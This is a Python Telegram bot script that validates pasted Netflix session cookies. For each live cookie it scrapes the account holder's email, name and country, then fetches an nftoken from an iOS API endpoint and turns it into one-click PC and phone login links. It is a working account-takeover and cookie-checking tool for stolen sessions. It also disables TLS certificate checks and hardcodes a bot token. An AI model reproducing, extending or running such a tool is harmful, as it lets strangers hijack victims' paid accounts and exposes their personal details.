import re
import json
import requests
import urllib3
import urllib.parse
import telebot
from telebot import types

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"
bot = telebot.TeleBot(BOT_TOKEN)

# ================== STRONG COOKIE PARSER ==================
def load_cookies(text):
    text = text.strip()
    cookies = {}

    # Very aggressive NetflixId extraction
    patterns = [
        r'NetflixId=([^;,\s"]+)',
        r'"name":"NetflixId","value":"([^"]+)"',
        r'NetflixId["\']?\s*[:=]\s*["\']?([^"\']+)',
    ]

    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            cookies["NetflixId"] = match.group(1)
            break

    # SecureNetflixId
    match = re.search(r'SecureNetflixId=([^;,\s"]+)', text, re.IGNORECASE)
    if match:
        cookies["SecureNetflixId"] = match.group(1)

    return cookies

# ================== CHECKER ==================
def check_account(cookies):
    if not cookies.get("NetflixId"):
        return None

    sess = requests.Session()
    sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    for k, v in cookies.items():
        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")

    try:
        r = sess.get("https://www.netflix.com/account", timeout=25, allow_redirects=True)
    except:
        return None

    if "login" in r.url.lower() or r.status_code in (401, 403):
        return None

    html = r.text
    if '"membershipStatus":"CURRENT_MEMBER"' not in html:
        return None

    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
    name = _djs(_rx(r'"firstName":"([^"]+)"', html)) or "User"
    cc = _rx(r'"countryOfSignup":"([A-Z]{2})"', html, "US")

    # NFT Token
    tok = None
    try:
        headers = {"User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)", "Cookie": f"NetflixId={cookies['NetflixId']}"}
        r2 = requests.get("https://ios.prod.ftl.netflix.com/iosui/user/15.48", 
                         params={"responseFormat": "json"}, headers=headers, timeout=15, verify=False)
        if r2.status_code == 200:
            data = r2.json()
            tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
    except: pass

    if tok:
        safe = urllib.parse.quote(tok)
        login_pc = f"https://netflix.com/?nftoken={safe}"
        login_phone = f"https://netflix.com/unsupported?nftoken={safe}"
    else:
        login_pc = login_phone = "N/A"

    return {
        "name": name,
        "email": email or "N/A",
        "country": cc,
        "login_pc": login_pc,
        "login_phone": login_phone,
        "login_tv": "https://www.netflix.com/tv2"
    }

def _djs(s):
    if not s: return ""
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    return s.strip()

def _rx(pattern, text, default=""):
    m = re.search(pattern, text, re.S)
    return m.group(1) if m else default

# ================== BOT ==================
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("🔍 Check Cookie")
    bot.send_message(message.chat.id, "👋 Paste your Netflix cookie", parse_mode="HTML", reply_markup=markup)

@bot.message_handler(content_types=['text'])
def handle_text(message):
    if message.text == "🔍 Check Cookie":
        bot.send_message(message.chat.id, "📤 Paste cookie:")
        return

    cookies = load_cookies(message.text)
    if not cookies.get("NetflixId"):
        bot.reply_to(message, "❌ NetflixId not found. Try again.")
        return

    process_cookie(message, cookies)

def process_cookie(message, cookies):
    bot.send_chat_action(message.chat.id, 'typing')
    result = check_account(cookies)

    if not result:
        bot.reply_to(message, "❌ Invalid or expired cookie.")
        return

    text = f"""
🎬 <b>✅ NETFLIX ACCOUNT</b>

👤 <b>{result['name']}</b>
📧 <code>{result['email']}</code>
🌍 United States ({result['country']})

🔑 <b>NFT Token Login</b>
    """

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🖥 PC Login", url=result["login_pc"]))
    markup.add(types.InlineKeyboardButton("📱 Phone Login", url=result["login_phone"]))
    markup.add(types.InlineKeyboardButton("📺 TV Login", url=result["login_tv"]))

    bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=markup)

print("🚀 Bot is Running...")
bot.infinity_polling()
